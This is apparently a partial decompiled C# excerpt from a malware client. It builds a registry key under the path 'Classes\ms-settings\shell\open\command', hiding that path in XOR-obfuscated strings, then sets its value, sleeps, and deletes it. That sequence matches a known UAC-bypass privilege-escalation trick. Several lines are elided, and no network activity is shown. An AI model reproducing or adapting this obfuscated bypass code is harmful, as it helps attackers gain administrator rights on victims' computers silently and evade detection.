...
namespace Client
{
	public class Sucks
	{
		public static void tosuck()
		{
			...
			{
				Sucks.Value(AlphaAndOmega.BCutEncrypt("Ifkyyoy"));
				Sucks.Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmy"));
				Sucks.Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboff"));
				Sucks.Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezod"));
				RegistryKey registryKey = Sucks.Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn"));
			...
			{
				Sucks.Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn")).SetValue("", "", RegistryValueKind.String);
			}
			Thread.Sleep(10000);
			string location = Assembly.GetExecutingAssembly().Location;
			Sucks.Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn")).DeleteSubKeyTree(location);
		}
		...
		public static RegistryKey Value(string string_0)
		{
			...
			if (!Sucks.checksubkey(registryKey))
			{
